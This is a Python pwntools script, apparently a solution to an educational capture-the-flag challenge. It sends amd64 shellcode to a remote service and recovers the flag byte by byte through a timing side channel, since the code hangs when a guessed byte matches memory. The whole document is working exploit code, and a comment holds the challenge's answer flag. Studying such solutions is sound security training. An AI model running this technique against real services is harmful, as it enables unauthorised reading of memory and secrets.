from pwn import *
from time import time

context.arch = "amd64"

def peek(idx, b):
    sc = asm(f"""
    mov rcx, qword ptr [rsp]
    sub rcx, 0x13dc
    add rcx, 0x4040

    movzx eax, byte ptr [rcx+{idx}]
    cmp al, {b}
    je $-0x2
    ret
    """)
    bingo = False

    r = remote("edu-ctf.zoolab.org", 10002)

    start = time()
    r.recvline()
    r.send(sc)

    try:
        r.recvline(timeout=2)
    except:
        ...

    if time() - start > 1.5:
        bingo = True

    r.close()

    return bingo

if __name__ == "__main__":
    # FLAG{piano_d113f1c3f9ed8019288f4e8ddecfb8ec}
    flag = str()
    for idx in range(48):
        for b in range(33, 127):
            if peek(hex(idx), b):
                flag += chr(b)
                print(flag)
                break
    print(flag)